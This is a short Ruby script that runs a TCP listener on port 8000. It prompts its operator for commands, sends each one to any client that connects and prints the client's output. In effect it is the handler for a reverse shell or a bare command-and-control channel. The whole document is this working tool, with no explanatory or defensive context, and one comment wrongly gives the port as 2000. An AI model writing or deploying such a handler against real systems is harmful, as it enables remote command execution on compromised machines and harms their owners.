#!/usr/bin/ruby

require "socket"
require "colorize"

port = 8000
puts "[+] Starting Server at port : #{port}".yellow
time = Time.now
puts "[+] Start at : #{time}".yellow
server = TCPServer.open(port)   # Socket to listen on port 2000
loop {                          # Servers run forever
  Thread.start(server.accept) do |client|
    while true
      print "[+] Enter Command : ".blue
      com = gets.chomp
      client.puts(com)
      puts "\n+------------------------------------------------------------+"
      puts client.recv(10000)
      puts "+------------------------------------------------------------+\n"
    end
  end
}
